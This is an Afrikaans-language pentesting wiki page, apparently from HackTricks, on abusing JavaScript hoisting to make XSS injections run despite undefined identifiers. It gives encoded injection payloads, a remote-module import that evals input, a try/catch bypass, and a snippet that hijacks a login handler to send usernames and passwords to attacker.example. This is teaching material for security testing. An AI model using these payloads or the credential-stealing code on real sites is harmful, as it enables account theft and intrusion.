# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

In die JavaScript taal word 'n meganisme beskryf bekend as **Hoisting** waar deklarasies van veranderlikes, funksies, classes, of imports konseptueel na die bokant van hul scope gehaal word voordat die kode uitgevoer word. Hierdie proses word outomaties deur die JavaScript engine uitgevoer, wat die script in meerdere passe deurgaan.

Tydens die eerste pas parse die engine die kode om te kontroleer vir sintaksisfoute en omskep dit in 'n abstract syntax tree. Hierdie fase sluit hoisting in, 'n proses waar sekere deklarasies na die top van die execution context verskuif word. Indien die parsing-fase suksesvol is, wat aandui dat daar geen sintaksisfoute is nie, gaan die script-uitvoering voort.

Dit is belangrik om te verstaan dat:

1. Die skrip moet vry wees van sintaksisfoute voordat uitvoering kan plaasvind. Sintaksisreëls moet streng nagekom word.
2. Die plasing van kode binne die skrip beïnvloed uitvoering as gevolg van hoisting, alhoewel die uitgevoerde kode mag verskil van sy teksuele voorstelling.

#### Tipes van Hoisting

Gebaseer op inligting van MDN, is daar vier onderskeibare tipes hoisting in JavaScript:

1. **Value Hoisting**: Maak dit moontlik om 'n veranderlike se waarde binne sy scope te gebruik voordat dit verklaar is.
2. **Declaration Hoisting**: Laat toe om na 'n veranderlike binne sy scope te verwys voordat dit verklaar is sonder om `ReferenceError` te veroorsaak, maar die veranderlike se waarde sal `undefined` wees.
3. Hierdie tipe verander die gedrag binne sy scope omdat die veranderlike se deklarasie voor die lyn waarin dit eintlik verklaar word voorkom.
4. Die deklarasie se newe-effekte gebeur voordat die res van die kode wat dit bevat geëvalueer word.

In meer detail vertoon function declarations tipe 1 hoisting-gedrag. Die sleutelwoord `var` toon tipe 2-gedrag. Lexikale deklarasies, wat `let`, `const`, en `class` insluit, toon tipe 3-gedrag. Laastens is `import`-verklarings uniek omdat hulle gehoist word met beide tipe 1 en tipe 4 gedrag.

## Scenario's

Daarom, as jy scenario's het waar jy kan **Inject JS code after an undeclared object** is used, kan jy die sintaksis **fix the syntax** deur dit te verklaar (sodat jou kode uitgevoer word in plaas daarvan om 'n fout te gooi):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Meer scenario's
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Hoisting om uitsonderingshantering te omseil

Wanneer die sink binne 'n `try { x.y(...) } catch { ... }` geplaas is, **ReferenceError** sal die uitvoering stop voordat jou payload uitgevoer word. Jy kan die ontbrekende identifier vooraf verklaar sodat die oproep oorleef en jou ingespuite uitdrukking eers uitgevoer word:
```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```
`function x(){}` word voor evaluering opgetel, so die parser gooi nie meer 'n fout op `x.y(...)` nie; `prompt()` voer uit voordat `y` opgelos is, en dan word 'n `TypeError` gegooi nadat jou kode uitgevoer is.

### Voorkom latere deklarasies deur 'n naam met const te sluit

As jy kan uitvoer voordat 'n top-level `function foo(){...}` gepars is, sal die deklarasie van 'n leksikale binding met dieselfde naam (bv. `const foo = ...`) verhoed dat die latere funksie-verklaring daardie identifier herbind. Dit kan in RXSS misbruik word om kritieke handlers wat later op die bladsy gedefinieer is te kaap:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Aantekeninge
- Dit berus op uitvoerorde en globale (top-level) scope.
- As jou payload binne `eval()` uitgevoer word, onthou dat `const/let` binne `eval` block-scoped is en nie globale bindings sal skep nie. Injecteer 'n nuwe `<script>` element met die kode om 'n ware globale `const` te vestig.

### Dynamiese import() met gebruiker-beheerde specifiers

Server-side rendered apps stuur soms gebruikersinvoer na `import()` om komponentes lui te laai. As 'n loader soos `import-in-the-middle` teenwoordig is, word wrapper modules vanaf die specifier gegenereer. Hoisted import evaluation fetches en executes the attacker-controlled module before subsequent lines run, enabling RCE in SSR contexts (see CVE-2023-38704).

### Gereedskap

Moderne skandeerders het begin om eksplisiete hoisting payloads by te voeg. **KNOXSS v3.6.5** lys "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" en "Hoisting Override" toetsgevalle; wanneer dit teen RXSS-kontekste uitgevoer word wat `ReferenceError`/`TypeError` gooi, bring dit vinnig hoist-based gadget-kandidate aan die lig.

## References

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)

{{#include ../../banners/hacktricks-training.md}}
